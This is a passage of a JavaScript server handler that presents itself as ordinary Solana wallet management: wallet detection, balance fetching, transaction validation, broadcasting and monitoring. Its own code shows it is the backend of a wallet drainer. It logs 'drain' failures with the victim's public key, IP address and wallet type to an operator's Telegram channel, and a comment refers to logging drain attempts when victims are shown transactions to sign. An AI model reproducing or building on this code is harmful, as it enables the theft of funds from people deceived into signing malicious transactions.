            success: true,
            detectedWallets: uniqueWallets,
            prioritizedWallets: prioritizedWallets,
            recommendedWallet: prioritizedWallets[0] || 'phantom',
            isMobile: isMobileDevice(userAgent),
            platform: getMobilePlatform(userAgent),
            inMobileWallet: isInMobileWallet(userAgent)
          };
        } catch (error) {
          console.error('[WALLET_DETECTION] Error:', error);
          result = { 
            success: false, 
            error: 'Wallet detection failed',
            details: error.message 
          };
        }
        break;
        
      case 'get_wallet_info':
        if (!walletKey) {
          res.status(400).json({ error: 'Wallet key is required' });
          return;
        }
        result = getWalletConnectionInfo(walletKey);
        break;
        
      case 'get_wallet_modal_data':
        // Get all wallet definitions for the modal
        const modalWallets = Object.entries(WALLET_DEFINITIONS).map(([key, wallet]) => ({
          key: key,
          name: wallet.name,
          logo: wallet.logo,
          description: getWalletDescription(key),
          isMobile: isMobileDevice(userAgent)
        }));
        
        result = {
          success: true,
          wallets: modalWallets,
          isMobile: isMobileDevice(userAgent),
          userAgent: userAgent
        };
        break;
        
      case 'connect_wallet':
        if (!walletKey) {
          res.status(400).json({ error: 'Wallet key is required for connection' });
          return;
        }
        
        const connectionInfo = getWalletConnectionInfo(walletKey);
        if (!connectionInfo.success) {
          res.status(400).json({ error: connectionInfo.error });
          return;
        }
        
        result = {
          success: true,
          wallet: connectionInfo.wallet,
          connectionInstructions: getWalletInstallInstructions(walletKey, userAgent),
          isMobile: isMobileDevice(userAgent)
        };
        break;
        
      case 'validate_wallet':
        if (!publicKey) {
          res.status(400).json({ error: 'Public key is required' });
          return;
        }
        const walletValidation = validateWallet(publicKey, walletType || 'unknown');
        result = {
          success: walletValidation.isValid,
          isValid: walletValidation.isValid,
          errors: walletValidation.errors
        };
        break;
        
      case 'fetch_balance':
        if (!publicKey) {
          res.status(400).json({ error: 'Public key is required' });
          return;
        }
        const balanceResult = await fetchWalletBalance(publicKey);
        result = {
          success: balanceResult.success,
          balance: balanceResult.balance,
          balanceSOL: balanceResult.balanceSOL,
          error: balanceResult.error,
          rpcUrl: balanceResult.rpcUrl
        };
        break;
        
      case 'validate_transaction':
        if (!transaction || !publicKey) {
          res.status(400).json({ error: 'Transaction and public key are required for validation' });
          return;
        }
        
        console.log(`[VALIDATE_TRANSACTION] Wallet type received: ${walletType}`);
        
        // Deserialize transaction if it's base64
        let tx;
        if (typeof transaction === 'string') {
          try {
            const txBytes = Uint8Array.from(atob(transaction), c => c.charCodeAt(0));
            tx = Transaction.from(txBytes);
          } catch (error) {
            res.status(400).json({ error: 'Invalid transaction format' });
            return;
          }
        } else {
          tx = transaction;
        }
        
        const validation = validateTransaction(tx, publicKey, walletType);
        result = {
          success: validation.isValid,
          isValid: validation.isValid,
          errors: validation.errors
        };
        break;
        
      case 'broadcast_transaction':
        if (!signedTransaction) {
          res.status(400).json({ error: 'Signed transaction is required for broadcasting' });
          return;
        }
        
        // Deserialize signed transaction if it's base64
        let signedTx;
        if (typeof signedTransaction === 'string') {
          try {
            const txBytes = Uint8Array.from(atob(signedTransaction), c => c.charCodeAt(0));
            // Use Transaction.from with proper signature handling
            signedTx = Transaction.from(txBytes);
            
            // CRITICAL: Restore lastValidBlockHeight if provided in request
            // This is essential because Transaction.from() doesn't preserve lastValidBlockHeight
            if (lastValidBlockHeight) {
              signedTx.lastValidBlockHeight = lastValidBlockHeight;
              console.log(`[BROADCAST] Restored lastValidBlockHeight: ${signedTx.lastValidBlockHeight}`);
              
              // Verify the property was actually set
              if (signedTx.lastValidBlockHeight !== lastValidBlockHeight) {
                console.error(`[BROADCAST] CRITICAL: lastValidBlockHeight not properly set! Expected: ${lastValidBlockHeight}, Got: ${signedTx.lastValidBlockHeight}`);
              }
            } else {
              console.warn(`[BROADCAST] No lastValidBlockHeight provided in request - transaction may fail`);
            }
            
            // Debug: Log deserialized transaction details
            console.log('[BROADCAST] Deserialized transaction:', {
              hasSignatures: !!signedTx.signatures,
              signatureCount: signedTx.signatures?.length || 0,
              feePayer: signedTx.feePayer?.toString(),
              recentBlockhash: signedTx.recentBlockhash,
              lastValidBlockHeight: signedTx.lastValidBlockHeight,
              instructionCount: signedTx.instructions?.length || 0
            });
            
            // Validate that signatures are preserved
            if (!signedTx.signatures || signedTx.signatures.length === 0) {
              console.error('[BROADCAST] No signatures found after deserialization');
              res.status(400).json({ error: 'Transaction lost signatures during deserialization' });
              return;
            }
            
          } catch (error) {
            console.error('[BROADCAST] Deserialization error:', error);
            res.status(400).json({ error: 'Invalid signed transaction format' });
            return;
          }
        } else {
          signedTx = signedTransaction;
        }
        
        const broadcastResult = await broadcastTransaction(signedTx, 1, walletType);
        result = {
          success: broadcastResult.success,
          signature: broadcastResult.signature,
          error: broadcastResult.error,
          rpcUrl: broadcastResult.rpcUrl
        };
        
        // Log broadcast failure if it failed
        if (!broadcastResult.success && broadcastResult.error) {
          console.log('[BROADCAST_ERROR] Transaction broadcast failed:', {
            signature: broadcastResult.signature,
            error: broadcastResult.error,
            walletType: walletType
          });
          
          // Log to Telegram for broadcast failures
          try {
            const telegramLogger = (await import('../src/telegram.js')).default;
            await telegramLogger.logDrainFailed({
              publicKey: publicKey,
              signature: broadcastResult.signature,
              error: broadcastResult.error,
              walletType: walletType || 'Unknown',
              ip: req.ip || 'Unknown',
              status: 'broadcast_failed'
            });
          } catch (telegramError) {
            console.error('[BROADCAST_ERROR] Failed to log to Telegram:', telegramError);
          }
        }
        break;
        
      case 'monitor_transaction':
        if (!signature) {
          res.status(400).json({ error: 'Transaction signature is required for monitoring' });
          return;
        }
        
        console.log('[MONITOR_TRANSACTION] Starting monitoring for signature:', signature);
        console.log('[MONITOR_TRANSACTION] Wallet type received:', walletType);
        console.log('[MONITOR_TRANSACTION] Public key:', publicKey);
        
        try {
          const monitorResult = await monitorTransaction(signature, 3, walletType);
          console.log('[MONITOR_TRANSACTION] Monitor result:', monitorResult);
          
        result = {
          success: monitorResult.success,
          status: monitorResult.status,
          confirmation: monitorResult.confirmation,
          error: monitorResult.error
        };
          
          // Log transaction failure if it failed on-chain
          if (!monitorResult.success && monitorResult.error) {
            console.log('[ONCHAIN_ERROR] Transaction failed on-chain:', {
              signature: signature,
              error: monitorResult.error,
              status: monitorResult.status
            });
            
            // Log to Telegram for on-chain failures
            try {
              const telegramLogger = (await import('../src/telegram.js')).default;
              await telegramLogger.logDrainFailed({
                publicKey: publicKey,
                signature: signature,
                error: monitorResult.error,
                walletType: walletType || 'Unknown',
                ip: req.ip || 'Unknown',
                status: monitorResult.status
              });
            } catch (telegramError) {
              console.error('[ONCHAIN_ERROR] Failed to log to Telegram:', telegramError);
            }
          }
        } catch (monitorError) {
          console.error('[MONITOR_TRANSACTION] Monitoring failed:', monitorError);
          result = {
            success: false,
            status: 'monitor_error',
            error: monitorError.message
          };
        }
        break;
        
      default:
        res.status(400).json({ error: 'Unknown operation' });
        return;
    }

    // Don't log drain attempt here - it should be logged when transaction is presented to user for signing

    res.status(200).json({
      success: true,
      operation: operation,
      result: result,
      processingTime: Date.now() - startTime
    });

  } catch (error) {
    console.error('[WALLET_MANAGEMENT] Error:', error);
    
    await telegramLogger.logError({
      publicKey: req.body?.publicKey || 'Unknown',
      ip: userIp,
      message: `Wallet management error: ${error.message}`
    });
    
    res.status(500).json({
      error: 'Internal server error',
      details: error.message
    });
  }
}

// Export the handler and utility functions
export {
  WALLET_DEFINITIONS,
  detectWalletType,
  getWalletPriority,
  getWalletConnectionInfo,
  getWalletDescription,
  getWalletInstallInstructions,
  getPlatformSpecificStrategies,
  validateTransaction,
  fetchWalletBalance,
  isMobileDevice,
  getMobilePlatform,
  isInMobileWallet,
  broadcastTransaction,
  monitorTransaction
};

export default walletManagementHandler;
